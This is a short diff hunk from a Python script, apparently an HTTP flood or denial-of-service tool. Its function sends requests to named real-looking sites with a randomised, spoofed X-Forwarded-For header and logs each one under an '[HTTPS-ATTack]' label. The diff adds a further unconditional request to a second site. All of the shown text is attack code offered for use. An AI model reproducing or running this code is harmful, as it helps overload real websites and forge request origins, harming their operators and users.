@@ -3266,6 +3266,7 @@ def req_random_ip():
      "User-Agent":"WTech/2.0",
      "X-Forwarded-For":f"{ipv4},127.0.0.1,223.45.67.89"
     }
+    requests.get(url="https://wp.wtechhk.xyz/")
     res = requests.get(url="https://vproxy.cloud/",headers=headers)
     print(f"[HTTPS-ATTack] 127.0.0.1 -- https://vproxy.cloud/ Response: {res}")
 
